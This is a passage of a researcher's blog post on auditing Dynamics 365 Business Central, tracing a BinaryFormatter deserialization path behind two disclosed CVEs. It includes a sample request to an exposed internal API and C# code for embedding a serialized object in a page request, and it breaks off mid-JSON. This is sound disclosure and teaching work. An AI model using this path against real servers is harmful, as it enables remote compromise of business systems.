---
layout: post
date:   2024-07-10 03:00:00 +0200
title:  "Dynamics 365 Business Central - A Journey With Ups and Downs"
categories: vulns4free
---

> Microsoft Dynamics 365 Business Central (formerly Microsoft Dynamics NAV) – ERP and CRM software-as-a-service product meant for small and mid-sized businesses.

Recently, I was thinking about different Microsoft products and their statistical vulnerability distribution in the near past. What are the most popular targets for researchers? Classically, we heard about SharePoint, Exchange etc. So I focused on a different product: the Dynamics 365 suite. I didn't have any experience with this product family but I saw at least several **Business Central** installations during assessments over the years. End of April 2024, I submitted two vulnerabilities to the Microsoft Security Response Center (MSRC) and luckily, they got accepted (**CVE-2024-35248, CVE-2024-35249**) and even matched the Dynamics 365 bounty criteria. The reward was surprisingly generous and I decided to donate 100% of the bounty to charities for childen.

Since I again learnt tons of new things, I thought it might be the best idea to share my whole journey with you in a blog post. So a short warning at the beginning: this blog post will become a bit lengthy and maybe also boring to some more experienced researchers. We'll read a lot about my thought processes during the audit, including rabbit holes, and inline advices which hopefully will help others. I tried to write the blog in a similar style to a [Java variant](https://frycos.github.io/vulns4free/2022/05/24/security-code-audit-fails.html), this time for .NET. 

And finally, I'll conclude my introductory words with a "Thank you, MSRC" for proofreading this blog post.

# Setup and Technology Analysis

Luckily, we can find on-premises installation files at [Microsoft's download sites](https://www.microsoft.com/en-us/download/details.aspx?id=105617). At that time of starting my research, I got the **Microsoft Dynamics 365 Business Central 2023 Release Wave 2** setup and installed it on a fully patched Windows Server 2022. Compared to other product audits and their (PITA) setup routines, this experience was quite satisfying. The installation came with SQL Express 2019 and a demo database such that after the installation wizard ended, one could play with a fully functional system.

> **Advice #1**: Make sure that you install the latest version with all patches/hotfixes available before starting any testing.

{:refdef: style="text-align: center;"}
![Dynamics 365 Business Central landing page](/assets/images/dynamics/dynamicslandingpage.png)
{: refdef}


So what are our steps to collect some first facts about the research target?

* We play a little bit with the application of course, using a MitM proxy tool of our choice.
* Our web application seems to be running under the root path `/BC230/`.
* The largest proportion of communication quickly switches to a WebSocket-based protocol talking on path `/BC230/csh`.
* Looking into the IIS Manager (`inetmgr.exe`), an Application Pool `BC230` can be found.
* Under *Sites*, an entry "Microsoft Dynamics 365 Business Central Web Client" exists, pointing to `C:\inetpub\wwwroot\Microsoft Dynamics 365 Business Central Web Client` which doesn't contain a lot of data.
* The important stuff seems to come from the directory `C:\inetpub\wwwroot\BC230` but how does it all fit together?
* Taking another look under the "Microsoft Dynamics 365 Business Central Web Client" site reveals a *BC230 Application* configuration which indeed points to `C:\inetpub\wwwroot\BC230`. To understand the relationships between the running processes, the corresponding directories etc. took me a while. 

> **Advice #2**: You cannot read enough documentation on your target and its components (tech stack) in advance.

Now, we can start exploring the directory with its binaries and configuration files a bit more. A good starter in the root directory is the file `web.config` at `C:\inetpub\wwwroot\BC230\web.config`. 

> **Advice #3**: Try to know the typical artifacts for your tech stack by heart.

The first relevant part is shown next.

```xml
<aspNetCore requestTimeout="12:00:00" processPath=".\Prod.Client.WebCoreApp.exe" arguments="" stdoutLogEnabled="false" stdoutLogFile=".\logs\stdout" forwardWindowsAuthToken="true" hostingModel="OutOfProcess">
  <environmentVariables>
    <environmentVariable name="ASPNETCORE_ENVIRONMENT" value="Production" />
    <environmentVariable name="ASPNETCORE_HTTPS_PORT" value="443" />
  </environmentVariables>
</aspNetCore>
```

We find a process running from `C:\inetpub\wwwroot\BC230\Prod.Client.WebCoreApp.exe`. This process seems to be based on
ASP.NET Core and the `hostingModel` equals to `OutOfProcess`. Looking at more [Microsoft documentation](https://learn.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/?view=aspnetcore-8.0), I learnt that
an application can run in two modes with IIS: *in-process* or *out-of-process*.

> In-process hosting runs an ASP.NET Core app in the same process as its IIS worker process. In-process hosting provides improved performance over out-of-process hosting because requests aren't proxied over the loopback adapter, a network interface that returns outgoing network traffic back to the same machine.

For our *out-of-process* case, ASP.NET Core apps run in a process separate from the IIS worker process. So we expect the `Prod.Client.WebCoreApp.exe` process listening with some weird port on `localhost`. This is the case: listening at `localhost:23893` at one moment in time. So we attach to the process with [dnSpy](https://github.com/dnSpy/dnSpy) and observe the target framework in the Assembly's metadata: `.NETCoreApp,Version=v6.0`.

> **Advice #4**: If you don't understand some terminology, try to google the hell out of it.

# Prod.Client.WebCoreApp.exe

We try enumerating the controllers first and in a next step checking if we can hit a breakpoint properly.
The namespaces can help to identify them but if one understands the underlying tech(nology) stack, you're able to guess
the relevant super classes often used in such projects. In this case, extending classes from `Microsoft.AspNetCore.Mvc.Controller`
can be easily listed with the dnSpy Analyzer.

{:refdef: style="text-align: center;"}
![Controllers](/assets/images/dynamics/dynamicsprodclientwebcontrollers.png)
{: refdef}

> **Advice #5**: Know the basic terminology of programming languages and software architecture to easily identify relevant classes, methods and relationships between them.

Taking a random controller such as `Microsoft.Dynamics.Nav.WebClient.Controllers.HealthController` should be enough for debug testing purposes.

```csharp
[HttpGet]
[AllowAnonymous]
public async Task<IActionResult> System()
{
	bool flag = await this.systemHealthChecker.IsSystemHealthyAsync().ConfigureAwait(false);
	bool healthy = flag;
	IActionResult actionResult;
	if (healthy)
	{
		actionResult = this.Json(new JsonRpcRestResponse(true));
	}
	else
	{
		actionResult = this.StatusCode(500, new JsonRpcRestResponse(false));
	}
	return actionResult;
}
```

The following request hits our breakpoint, as expected.

{:refdef: style="text-align: center;"}
![Debug test](/assets/images/dynamics/dynamicsprodclientwebdebugtest.png)
{: refdef}

Also notice that `Microsoft.AspNetCore.Authorization.AllowAnonymousAttribute` is one of the most interesting attributes (but not the only one of course) when searching for *unauthenticated attack surface enumeration*. 

> **Advice #6**: Sometimes understanding the tech stack to find Pre-/Un-Auth'd attack surface is not enough. You might have to read through the code for a while to identify variants.

So what I usually do is, going through *all* the controllers, trying to catch ideas about common coding patterns and libraries. E.g. in the `HealthController` code snippet above, you might have noticed a `Microsoft.Dynamics.Framework.UI.WebBase.JsonRpcRestResponse` constructor call. Having another look at our MitM proxy communication over WebSockets, we see a lot of JsonRpc calls.

```json
{
	"arguments": [
		{
			"jsonrpc": "2.0",
			"id": "|eba7f726212e414d98fed9d73615f3fd.494e6f336ccf49a6",
			"method": "Invoke",
			"params": [
				{
					"openFormIds": [
						"34"
					],
					"sessionId": "CRONUS USA, Inc.WIN-JQO5OPHMISF\\AdministratorSR6385094338752432191NAV",
					"sequenceNo": "lw14vop6#9",
					"lastClientAckSequenceNumber": 15,
					"telemetryClientActivityId": null,
					"navigationContext": {
						"applicationId": "NAV",
						"deviceCategory": 0,
						"spaInstanceId": "lw14vop7"
					},
					"supportedExtensions": null,
					"interactionsToInvoke": [
						{
							"interactionName": "InvokeExtensibilityMethod",
							"namedParameters": "{\"extensionObjectReference\":{\"id\":\"-2147483646\"},\"methodName\":\"PageReady\",\"arguments\":[],\"refreshData\":false}",
							"controlPath": "server:",
							"formId": "34",
							"callbackId": "b"
						},
						{
							"interactionName": "InvokeExtensibilityMethod",
							"namedParameters": "{\"methodName\":\"ControlAddInReady\",\"arguments\":[],\"refreshData\":false}",
							"controlPath": "server:c[4]",
							"formId": "2E",
							"callbackId": "c"
						}
					],
					"tenantId": null,
					"sessionKey": "sr6385094338752432191",
					"company": "CRONUS USA, Inc.",
					"telemetryClientSessionId": ""
				}
			]
		}
	],
	"invocationId": "9",
	"target": "InvokeRequest",
	"type": 1
}
```

> **Advice #7**: Imho the best approach for auditing is based on code analysis in combination with debugging. Not knowing the code good enough, doesn't help you poking a running target. Only reading code statically, on the other hand, will decrease your hit rate for interesting things significantly. Certain things are only observable and resolved during runtime.

Mentioning any kind of RPCs (remote procedure calls) usually fills my heart with joy (from an exploiter's perspective).
The responsible library is called [StreamJsonRpc](https://github.com/microsoft/vs-streamjsonrpc).

> A cross-platform .NETStandard library that implements the JSON-RPC wire protocol and can use System.IO.Stream, System.IO.Pipelines or WebSocket so you can use it with any transport.

With help of our debugger, we quickly realize how a callstack for an incoming message looks like.

```
StreamJsonRpc.dll!StreamJsonRpc.JsonMessageFormatter.ReadRequest(Newtonsoft.Json.Linq.JToken json) (IL=0x0000, Native=0x00007FF9F2FFFBF0+0x4F)
StreamJsonRpc.dll!StreamJsonRpc.JsonMessageFormatter.Deserialize(Newtonsoft.Json.Linq.JToken json) (IL≈0x012D, Native=0x00007FF9F2F80DE0+0x309)
StreamJsonRpc.dll!StreamJsonRpc.JsonMessageFormatter.Deserialize(System.Buffers.ReadOnlySequence<byte> contentBuffer) (IL=???, Native=0x00007FF9F2F80180+0x6B)
StreamJsonRpc.dll!StreamJsonRpc.WebSocketMessageHandler.ReadCoreAsync(System.Threading.CancellationToken cancellationToken) (IL=???, Native=0x00007FF9F23AC160+0x53D)
System.Private.CoreLib.dll!System.Threading.ExecutionContext.RunInternal(System.Threading.ExecutionContext executionContext, System.Threading.ContextCallback callback, object state) (IL≈0x0040, Native=0x00007FF9F1C846F0+0x77)
System.Private.CoreLib.dll!System.Runtime.CompilerServices.AsyncTaskMethodBuilder<StreamJsonRpc.Protocol.JsonRpcMessage>.AsyncStateMachineBox<StreamJsonRpc.WebSocketMessageHandler.<ReadCoreAsync>d__13>.MoveNext(System.Threading.Thread threadPoolThread) (IL≈0x003F, Native=0x00007FF9F2F59DD0+0xF4)
System.Net.WebSockets.dll!System.Net.WebSockets.ManagedWebSocket.ReceiveAsyncPrivate<System.Net.WebSockets.ValueWebSocketReceiveResult>(System.Memory<byte> payloadBuffer, System.Threading.CancellationToken cancellationToken)
```

I spent several days within this library and tried finding ways to invoke arbitrary methods on objects (or static classes) of my choice. This was my first rabbit hole that took more time than I would like to admit today. I still have tons of notes and there's a good chance I'll come back to it some day because at least I found some interesting breadcrumbs.

> **Advice #8**: Write down absolutely everything during your audit. You might need the information later (e.g. for writing a blog post :-P).

#### Hunting for Json Deserialization

Looking through this code base and listing the Assembly references of this library pointed me to another well-known JSON library: *Newtonsoft.Json*. One of my browser tabs always holds one great research paper: [Friday the 13th JSON Attacks](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf) by Alvaro Muñoz and Oleksandr Mirosh. Exploitation of *Newtonsoft.Json* deserializers (and others) was explained in great detail and basically
comes down to this: one has to control the type for the objects being deserialized on the other end of the wire. Type information is only included if explicitly stated via `Newtonsoft.Json.TypeNameHandling` values other than `None`.

So let's search for some candidates. A first hit found by looking at dnSpy Analyzer trees is `System.Object Microsoft.Dynamics.Nav.Types.JsonTypeHintHelper::Read(Newtonsoft.Json.JsonReader,Newtonsoft.Json.JsonSerializer,Microsoft.Dynamics.Nav.Types.JsonTypeHint)`. A custom class with the following code.

```csharp
internal static object Read(JsonReader reader, JsonSerializer serializer, JsonTypeHint typeHint)
{
	switch (typeHint)
	{
	case JsonTypeHint.Int:
		return reader.ReadAsInt32();
	// [...snip...]
	case JsonTypeHint.ErrorInfoData:
		reader.Read();
		return serializer.Deserialize(reader, typeof(ErrorInfoData));
	default:
	{
		TypeNameHandling typeNameHandling = serializer.TypeNameHandling;
		if (serializer.SerializationBinder is NavSerializationBinder)
		{
			serializer.TypeNameHandling = TypeNameHandling.All; // <---
		}
		reader.Read();
		object obj = serializer.Deserialize(reader);
		serializer.TypeNameHandling = typeNameHandling; // <---
		return obj;
	}
	}
}
```

We can indeed find several cases for which full type control seems to be possible. Either,
there could be an instance of `Newtonsoft.Json.JsonSerializer` with an insecure `TypeNameHandling` choice,
or with a `SerializationBinder` of type `Microsoft.Dynamics.Nav.Types.NavSerializationBinder`.
[SerializationBinders](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.serializationbinder?view=netframework-4.8) originally were not meant to be used as a method for defense but at least can work
for some cases. I.e. the data object binding procedures are controllable within a certain degree of accuracy, and therefore often used to protect against dangerous "deserialization gadgets". My colleague Markus showed in his research ["Bypassing .NET Serialization Binders"](https://code-white.com/blog/2022-06-bypassing-dotnet-serialization-binders/) that there are many pitfalls leading to bypasses. So it does make sense to have a look at this SerializationBinder implementation first.

`Microsoft.Dynamics.Nav.Types.NavSerializationBinder` implements its own `System.Type Microsoft.Dynamics.Nav.Types.NavSerializationBinder::BindToType(System.String,System.String)` method which itself calls `System.Boolean Microsoft.Dynamics.Nav.Types.NavSerializationBinder::TryBindToType(System.String,System.String,System.Type&)`.

```csharp
internal bool TryBindToType(string assemblyName, string typeName, out Type bindToType)
{
		bool validType = false;
		if (!string.IsNullOrEmpty(this.allowedTypeName) && string.Equals(typeName, this.allowedTypeName, StringComparison.Ordinal) && string.Equals(assemblyName, this.allowedAssemblyName, StringComparison.Ordinal)) // [1]
		{
		validType = true;
		}
		if (!validType)
		{
		validType = NavSerializationBinder.ProductAssemblies.Contains(assemblyName); // [2]
		}
		if (validType)
		{
		bindToType = (validType ? Type.GetType(typeName + ", " + assemblyName) : null);
		return validType && bindToType != null;
		}
		string assemblyQualifiedName = typeName + ", " + assemblyName;
		if (NavSerializationBinder.KnownRelatedTypes.Contains(assemblyQualifiedName)) // [3]
		{
		bindToType = Type.GetType(assemblyQualifiedName);
		if (bindToType != null)
		{
		return true;
		}
		}
		bindToType = Type.GetType(typeName);
		if (bindToType != null)
		{
		return true;
		}
		bindToType = NavSerializationBinder.NetStandardAssembly.GetType(typeName); // [4]
		return bindToType != null;
}
```

It makes several case distinctions based on pre-defined sets of "allowed types".

* A class member named `allowedTypeName`
* A class member named `allowedAssemblyName`

These turned out to be irrelevant, at least for my installation, because e.g. `allowedTypeName` was `null` at [1].

The `ProductAssemblies` HashSet [2] is filled by ``System.Collections.Generic.HashSet`1<System.String> Microsoft.Dynamics.Nav.Types.NavSerializationBinder::InitAssemblies()``, basically containing namespaces from the very same .NET Assembly itself plus its references. Another HashSet `KnownRelatedTypes` [3] is a fixed list of Assembly names. Finally, a last decision is made at [4] with help of the Assembly variable `NetStandardAssembly`. The Assembly name again is hard-coded, here with a value of `netstandard, Version=2.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51`.

[.NET Standard 2.0](https://learn.microsoft.com/en-us/dotnet/standard/net-standard?tabs=net-standard-1-0) isn't yet another .NET architecture/library/framework or so but just an "aggreement API" between different .NET implementations.

> .NET Standard is a formal specification of .NET APIs that are available on multiple .NET implementations. The motivation behind .NET Standard was to establish greater uniformity in the .NET ecosystem. .NET 5 and later versions adopt a different approach to establishing uniformity that eliminates the need for .NET Standard in most scenarios. However, if you want to share code between .NET Framework and any other .NET implementation, such as .NET Core, your library should target .NET Standard 2.0.

It is a good thing to understand where these variables are initialized etc. but for me it's often easier to simply set some breakpoints and retrieve the lists directly during runtime. So I already did the heavy-lifting for you, here is the list.

```
ProductAssemblies:
"Microsoft.BusinessCentral.Telemetry.OpenTelemetry, Version=8.1.23275.1, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
"Microsoft.Dynamics.Nav.Types.Report.Base, Version=23.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
"Microsoft.Dynamics.Nav.Common, Version=23.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
"Microsoft.IO.RecyclableMemoryStream, Version=1.4.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
"Microsoft.Dynamics.Nav.AL.Common, Version=12.7.14.31432, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
"Microsoft.Dynamics.Nav.Language, Version=23.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
"Microsoft.Dynamics.Nav.Common.Logging, Version=23.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
"Microsoft.Dynamics.Nav.Types, Version=23.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"

KnownRelatedTypes:
"System.Net.HttpStatusCode, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
"System.Version, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
"System.Guid, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
"System.Data.DataTable, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"

NetStandardAssembly:
"System.Private.CoreLib, Version=6.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e"
```

After a bit of knowledge gathering on the restrictions for deserializations with `NavSerializationBinder`'s protection, let's find out if this is used somewhere. Let me introduce you to my next rabbit hole.

#### Just Another Rabbit Hole

Searching for `NavSerializationBinder` uses, the first entry in dnSpy's Analyzer tab is a static method `Microsoft.Dynamics.Nav.Client.DataBinder.NavFilterHelper::ReadNavFilterGroupFromPersonalization(System.Xml.XmlReader,System.String)`.

```csharp
internal static NavFilterGroup[] ReadNavFilterGroupFromPersonalization(XmlReader xmlReader, string personalizationName)
{
		NavFilterGroup[] filterGroups = Array.Empty<NavFilterGroup>();
		if (xmlReader.LocalName == personalizationName)
		{
		xmlReader.ReadStartElement(personalizationName);
		using (MemoryStream stream = new MemoryStream(Convert.FromBase64String(xmlReader.ReadContentAsString())))
		{
		BinaryFormatter formatter = new BinaryFormatter
		{
		Binder = new NavSerializationBinder(typeof(NavFilterGroup[]))
		};
		try
		{
		filterGroups = (NavFilterGroup[])formatter.Deserialize(stream);
		}
		catch (NavSerializationException serializationException)
		// [...snip...]
```

Here, the `NavSerializationBinder` isn't used in a Json Deserializer context but for a `System.Runtime.Serialization.Formatters.Binary.BinaryFormatter` case. So what did we learn? `SerializationBinder` of course can be used by different deserialization implementations if each of them respects the `SerializationBinder` contracts.

But we're interested in how this sink can be reached from a user-controlled request, be it over the HTTP or WebSocket API.
The dnSpy search function doesn't help here anymore, this code doesn't seem to be called from anywhere. Right, in this case. But often wrong. The typical reason for being "wrong": one has to understand the architecture, tech stack and programming patterns to connect certain dots properly. dnSpy's Analyzer is an amazing tool but it doesn't replace knowledge for all aspects of .NET languages.

> **Advice #9**: Know your tools. They help you through the day but can hide information from you, if you don't understand them correctly.

So, I found an interesting call chain all the way back to `Microsoft.Dynamics.Nav.Client.Web.ObservingAutomationHandler::InvokeClientExtensionMethod(Microsoft.Dynamics.Framework.UI.LogicalControl,System.String,System.String,Microsoft.Dynamics.Nav.Types.NavAutomationArgument[])` which should look familiar to you (see us talking about JsonRpc requests above). With the JsonRpc request above we're able to hit `Microsoft.Dynamics.Nav.Client.Web.InvokeExtensibilityMethodInteraction::InvokeCore(Microsoft.Dynamics.Nav.Client.Web.InvokeExtensibilityMethodInteractionInput)`, i.e. only half the way. From the call chain, I assumed that the `arguments[]` Array was my object of desire to inject some interesting deserialization gadgets but the connection to `Microsoft.Dynamics.Nav.Client.Web.ObservingAutomationHandler::InvokeClientExtensionMethod(Microsoft.Dynamics.Framework.UI.LogicalControl,System.String,System.String,Microsoft.Dynamics.Nav.Types.NavAutomationArgument[])` was still missing, no breakpoint hit. I wondered why and traced back the call to `System.Void Microsoft.Dynamics.Nav.Client.FormBuilder.NavDesignerService::StopDesigner(Microsoft.Dynamics.Framework.UI.LogicalForm)` at the very end of `System.Void Microsoft.Dynamics.Nav.Client.FormBuilder.NavDesignerService::StartCore(Microsoft.Dynamics.Framework.UI.LogicalForm,Microsoft.Dynamics.Framework.UI.DesignerLevels)`. My fail here: I should have taken more time to understand the target application in greater detail. So after reading some more [documentation](https://learn.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/devenv-inclient-designer), I knew how to hit the `StartCore` method *but*...the `StopDesigner` wasn't reached with this kind of request. This took me several evenings to realize.

### Back to the Drawing Board

I realized that a lot of potentially interesting calls led to nowhere, so let's change the audit methods a little bit.
If you're getting lost in tons and thousands of lines of code, use another tool. I chose *Wireshark* because why would all this dead code even exist?

> **Advice #10**: Use different tools for taking a different perspective on the same problem.

And because we're interested in somebody using a specific "SerializationBinder", we also make a breakpoint at `System.Type Microsoft.Dynamics.Nav.Types.NavSerializationBinder::BindToType(System.String,System.String)`. When it'll be hit, we could match the timing easily with our Wireshark recording. And it didn't took long until we got a hit.

{:refdef: style="text-align: center;"}
![Found a Type](/assets/images/dynamics/dynamicsfoundtype.png)
{: refdef}

So some process is sending around requests with a typed Json, i.e. `TypeNameHandling != None`. But we found this in a response, even worse at TCP port **7085** and not **8080**. There also seems to be a complex session management in place, looking at the header values `ClientSessionId, server-session-id` and more. Is this a road we should really follow?

Analyzing a few more data within Wireshark, we learn that our `Prod.Client.WebCoreApp.exe` talks a lot to *7085* on *localhost*. Using `netstat` or `TCPView` of [Sysinternal Suite](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite), we spot something really interesting.

{:refdef: style="text-align: center;"}
![7085 exposed](/assets/images/dynamics/dynamicsexposedports.png)
{: refdef}

Yes, `Prod.Client.WebCoreApp.exe` talks to *7085* but also is port **7085 exposed on all network interfaces**. This means by default we're able to reach this service from anywhere (ignoring hardened firewall rules), i.e. also remotely. First, we'll test interaction with this port on the same machine, for convience reasons but all this should work from a neighboring machine within the same network.

Again, we use some information from the very beginning. I remembered some setup issues (my fault tbh!) which I didn't mention. We found some 7085 port related APIs in our error logs such as `http://win-jqo5ophmisf:7085/BC230/client`. 

> **Advice #11**: Search for errors and interesting information in different sources. Be it Windows Event Manager, or application logs. Every additional logging mechanism may reveal something new.

We copy all the potential session management stuff from the Wireshark recordings and try a sample request.

{:refdef: style="text-align: center;"}
![7085 exposed](/assets/images/dynamics/dynamicsexamplerequest.png)
{: refdef}

# Microsoft.Dynamics.Nav.Server.exe

#### BinaryFormatter - A Good Old Friend

This somehow worked but also the response contained some `exceptionData` value with...a Base64 encoded **BinaryFormatter** serialized object. So I think now is a good time to switch the target process in dnSpy to `Microsoft.Dynamics.Nav.Server.exe`, from `C:\Program Files\Microsoft Dynamics 365 Business Central\230\Service\Microsoft.Dynamics.Nav.Server.exe`. Be warned because loading all the process related modules in dnSpy will eat all your RAM and other computing powers. Time to visit [DownloadMoreRam.com](https://downloadmoreram.com/) (thanks [George](https://x.com/cheorchie)!). Be also warned that in the end, you might end being disappointed: I was expecting this shortly after I spotted the BinaryFormatter utilization but nevertheless I tried to follow the path to gather deeper knowledge. Sounds mysterious?

> **Advice #12**: Sometimes following a seamingly hopeless path will open up new chances.

Now, back to our `Microsoft.Dynamics.Nav.Types.NavSerializationBinder` from `Microsoft.Dynamics.Nav.Types.dll`: it is also part of the loaded modules in this process! Searching through dnSpy Analyzer again, we find it being used in another *SerializationBinder* `Microsoft.Dynamics.Nav.Types.NavExceptionSerializationBinder`. Observing an Exception in a response with Base64 encoded `BinaryFormatter` serialized data and the naming of this *SerializationBinder* could be a coincidence but humans are triggered by matching patterns, so am I. Maybe our new `Microsoft.Dynamics.Nav.Server.exe` process is a little more accommodating for "sink to source" analyses. We find, again, the calling method `Microsoft.Dynamics.Nav.Common.ExceptionHandler::DeserializeFromByteArray(System.Byte[],System.Type)` for which the Byte Array method parameter gets deserialized with `System.Runtime.Serialization.Formatters.Binary.BinaryFormatter::Deserialize(System.IO.Stream)` with the corresponding *SerializationBinder*. The `DeserializeFromByteArray` method is used in a Setter `Microsoft.Dynamics.Nav.Types.NavRecordState::set_FormOpenExceptionData(System.Byte[])`. The Setter itself doesn't show up as being directly used somewhere else, dnSpy says, **but again**: know you technology, coding patterns etc.

Setters can be invoked by Json serializers so this might be the case for an incoming serialized object of `Microsoft.Dynamics.Nav.Types.NavRecordState`. Where is this class used? Tons of hits in Analyzer and so this took me a few hours until I found (one of the) applicable source(s). To shorten it a bit, we draw a call chain.

```
Microsoft.Dynamics.Nav.Types.NavRecordState
-> Microsoft.Dynamics.Nav.Types.GetPageRequest::State()
--> Microsoft.Dynamics.Nav.Service.AspNetCore.ClientDataController::StreamPageData(System.IO.Stream,Microsoft.Dynamics.Nav.Runtime.NavSession,Microsoft.Dynamics.Nav.Types.GetPageRequest)
---> Microsoft.Dynamics.Nav.Service.AspNetCore.ClientDataController/<GetPage>d__0
----> Microsoft.Dynamics.Nav.Service.AspNetCore.ClientDataController::GetPage(Microsoft.Dynamics.Nav.Types.GetPageRequest)
```

We land at a controller class `Microsoft.Dynamics.Nav.Service.AspNetCore.ClientDataController`.

```csharp
[SessionId]
[ApiController]
[ClientOperationBehavior(SessionUsage.UseCurrentSession, RunInTransaction = true, RetryAfterTransientError = true, TelemetryCategory = Category.Runtime)]
[Route("data")]
public class ClientDataController : ServiceOperationController
{
	// Token: 0x06000071 RID: 113 RVA: 0x00003C28 File Offset: 0x00001E28
	[HttpPost]
	[Route("page")]
	public Task<IActionResult> GetPage([FromBody] GetPageRequest request)
	{
		ClientDataController.<GetPage>d__0 <GetPage>d__;
		<GetPage>d__.<>t__builder = AsyncTaskMethodBuilder<IActionResult>.Create();
		<GetPage>d__.<>4__this = this;
		<GetPage>d__.request = request;
		<GetPage>d__.<>1__state = -1;
		<GetPage>d__.<>t__builder.Start<ClientDataController.<GetPage>d__0>(ref <GetPage>d__);
		return <GetPage>d__.<>t__builder.Task;
	}
	// [...snip...]
```

The `ApiControllerAttribute` is part of `Microsoft.AspNetCore.Mvc.Core.dll` and well-known for being annotated on classes which should process HTTP API requests within MVC architectures. According to the controller class name and its `RouteAttribute`, the URI should look like `/BC230/client/data/page`. Let's build a sample POST request with dummy data.

```
POST /BC230/client/data/page HTTP/1.1
Host: localhost:7085
ClientSessionId: d735db2b-596b-406d-babb-e620d1715708
ClientActivityId: 7d9aa805-c985-9f44-2f2c-81d9c0bae1e6
GatewayCorrelationId: 
baggage: 
server-tenant-id: 
server-session-id: semgx45dqql3pey2zieltqxa
traceparent: 00-7d9aa805c9859f442f2c81d9c0bae1e6-501286b131e65694-00
Content-Type: application/json
Content-Length: 6

{}
```

A breakpoint in `Microsoft.Dynamics.Nav.Service.AspNetCore.ClientDataController::GetPage(Microsoft.Dynamics.Nav.Types.GetPageRequest)` is hit, so our assumptions turned out to be correct. Remember to capture your session ID values from your nearby Wireshark companion, otherwise we'll get a response with status code `401 Unauthorized` and a body containing **"Missing headers"**. So how to build now your `BinaryFormatter` serialized object into the `Microsoft.Dynamics.Nav.Types.GetPageRequest` parameter? You should spin up your favorite C# IDE now, because we need some playground for `GetPageRequest -> NavRecordState -> FormOpenExceptionData byte[] typeof(NavBaseException)`. As a reminder, the relevant setters look like this.

```csharp
// Microsoft.Dynamics.Nav.Types.GetPageRequest
public NavRecordState State
{
	[CompilerGenerated]
	get
	{
		return this.<State>k__BackingField;
	}
	[CompilerGenerated]
	set
	{
		this.<State>k__BackingField = value;
	}
}

// Microsoft.Dynamics.Nav.Types.NavRecordState
[DataMember]
private byte[] FormOpenExceptionData
{
	get
	{
		if (this.formOpenException != null)
		{
			return ExceptionHandler.SerializeToByteArray(this.formOpenException);
		}
		return null;
	}
	set
	{
		if (value != null)
		{
			this.formOpenException = (NavBaseException)ExceptionHandler.DeserializeFromByteArray(value, typeof(NavBaseException));
		}
	}
}

```

Since `Microsoft.Dynamics.Nav.Types.Exceptions.NavBaseException` is an abstract class, for a PoC serialized object we need an implementation such as `Microsoft.Dynamics.Nav.Types.CommandLineArgumentsException`. A malicious object from e.g. ysoserial.NET then has to placed into a generically typed variable. Since `NavBaseException` inherits from `Exception` itself, `System.Collections.IDictionary System.Exception::_data` is a legit candidate. Now, we got everything needed to use a few lines of code to serialize our first payload.

```csharp
// GetPageRequest -> NavRecordState -> FormOpenExceptionData byte[] typeof(NavBaseException)
GetPageRequest getPageRequest = new GetPageRequest();
NavRecordState nrs = new NavRecordState();
NavBaseException navBaseException = new CommandLineArgumentsException();

var field = typeof(Exception).GetField("_data", BindingFlags.Instance | BindingFlags.NonPublic);
field.SetValue(navBaseException, new Dictionary<string, object>() { { "test", new Exception() } });
nrs.GetType().GetProperty("FormOpenException").SetValue(nrs, navBaseException, null); // Attention that the field FormOpenExceptionData operates on the same data
getPageRequest.State = nrs;
Console.WriteLine("[+] Serializing");
string json = JsonConvert.SerializeObject(getPageRequest, Formatting.Indented);
Console.WriteLine(json);
```

This will give us the following Json with an embedded BinaryFormatter serialized payload.

```json
{
  "PageRequestDefinition": null,
  "State": {
    "RunFormOnRec": false,
    "TableView": {
      "TableId": 0,
      "CurrentSortingFieldIds": null,
      "Ascending": true,
      "CurrentFilters": [],
      "SearchFilter": null
    },
    "FlushDataCache": false,
    "CurrentRecord": null,
    "NavFormEditable": true,
    "PromptMode": 0,
    "ValidateFieldsInOnNewRecord": true,
    "InsertLowerBoundBookmark": null,
    "InsertUpperBoundBookmark": null,
    "AllSelected": false,
    "SelectedRecords": [],
    "NonSelectedRecords": null,
    "ServerFormHandle": "00000000-0000-0000-0000-000000000000",
    "FormId": 0,
    "ParentFormId": 0,
